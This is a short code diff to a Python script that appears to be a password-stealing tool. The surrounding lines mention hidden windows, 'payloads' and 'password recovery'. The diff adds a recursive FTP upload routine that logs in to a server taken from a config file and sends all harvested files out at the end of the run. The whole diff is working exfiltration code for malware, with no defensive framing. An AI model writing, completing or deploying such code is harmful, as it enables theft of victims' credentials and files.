@@ -1,5 +1,6 @@
-import os, sys, ctypes, getpass, socket, subprocess, math, wmi, platform, datetime, time, requests
+import os, sys, ctypes, getpass, socket, subprocess, math, wmi, platform, datetime, time, requests, ftplib
 exec(open("config.py").read())
+
 
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -39,6 +40,32 @@ try:
 except OSError:
     pass
     inet = 0
+
+# ftp init
+if ftp["controller"]:
+    if inet:
+        iftp = ftplib.FTP()
+        iftp.connect(ftp["host"], ftp["port"])
+        iftp.login(ftp["username"], ftp["password"])
+        iftp.cwd(ftp["dir"])
+        def ftpGo(path):
+            files = os.listdir(path)
+            os.chdir(path)
+            iftp.mkd(root)
+            iftp.cwd(root)
+            for f in files:
+                if os.path.isfile(f):
+                    fh = open(f, 'rb')
+                    iftp.storbinary('STOR %s' % f, fh)
+                    fh.close()
+                elif os.path.isdir(f):
+                    iftp.mkd(f)
+                    iftp.cwd(f)
+                    ftpGo(f)
+            iftp.cwd('..')
+            os.chdir('..')
+    else:
+        log_error += "\n[ftp] -> Internet connection failed"
 
 os.chdir("payloads")
 # password recovery
@@ -220,6 +247,10 @@ if logging:
     fl.write(log_error)
     fl.close()
 
+# ftp Go
+if ftp["controller"] and inet:
+    ftpGo(rootdir)
+    iftp.close()
 
 # msg box
 if msgbox["controller"]:
